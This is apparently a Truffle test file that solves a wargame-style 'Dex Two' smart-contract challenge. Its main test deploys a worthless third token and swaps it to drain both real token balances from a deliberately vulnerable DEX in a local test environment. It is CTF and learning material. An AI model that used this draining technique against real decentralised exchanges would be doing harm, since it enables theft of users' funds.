const DexTwo = artifacts.require('DexTwo');
const SwappableTokenTwo = artifacts.require('SwappableTokenTwo');

contract('Dex', (accounts) => {
    let token1, token2, token3, dextwo;

    beforeEach( async () => {
        token1 = await SwappableTokenTwo.new('Suka', 'suk', 10000);
        token2 = await SwappableTokenTwo.new('Blyat', 'bly', 10000);
        token3 = await SwappableTokenTwo.new('Hack', 'hck', 10000);
        dextwo = await DexTwo.new(token1.address, token2.address);
    })

    xit('setting up challenge env', async () => {
        await token1.transfer(accounts[1], 10, {from:accounts[0]});
        await token2.transfer(accounts[1], 10, {from:accounts[0]});
        await token1.transfer(dextwo.address, 100, {from:accounts[0]});
        await token2.transfer(dextwo.address, 100, {from:accounts[0]});
        await token1.approve(dextwo.address, 10000, {from:accounts[1]});
        await token2.approve(dextwo.address, 10000, {from:accounts[1]});

        console.log(await dextwo.balanceOf(token1.address, accounts[1]));
        console.log(await dextwo.balanceOf(token2.address, accounts[1]));
        console.log(await dextwo.balanceOf(token1.address, dextwo.address));
        console.log(await dextwo.balanceOf(token2.address, dextwo.address));
        console.log(await token1.allowance(accounts[1], dextwo.address));
        console.log(await token2.allowance(accounts[1], dextwo.address));

    })

    it('hacking the dex sc with token3', async () => {
        await token1.transfer(accounts[1], 10, {from:accounts[0]});
        await token2.transfer(accounts[1], 10, {from:accounts[0]});
        await token1.transfer(dextwo.address, 100, {from:accounts[0]});
        await token2.transfer(dextwo.address, 100, {from:accounts[0]});
        await token1.approve(dextwo.address, 10000, {from:accounts[1]});
        await token2.approve(dextwo.address, 10000, {from:accounts[1]});

        await token3.transfer(dextwo.address, 100, {from:accounts[0]});
        await token3.transfer(accounts[1], 300, {from:accounts[0]});
        await token3.approve(dextwo.address, 10000, {from:accounts[1]});

        await dextwo.swap(token3.address, token1.address, 100, {from:accounts[1]});
        await dextwo.swap(token3.address, token2.address, 200, {from:accounts[1]});


        console.log(await dextwo.balanceOf(token1.address, dextwo.address));
        //console.log(await dextwo.balanceOf(token3.address, dextwo.address));
        console.log(await dextwo.balanceOf(token2.address, dextwo.address));
        //console.log(await dextwo.balanceOf(token3.address, dextwo.address));
    })
})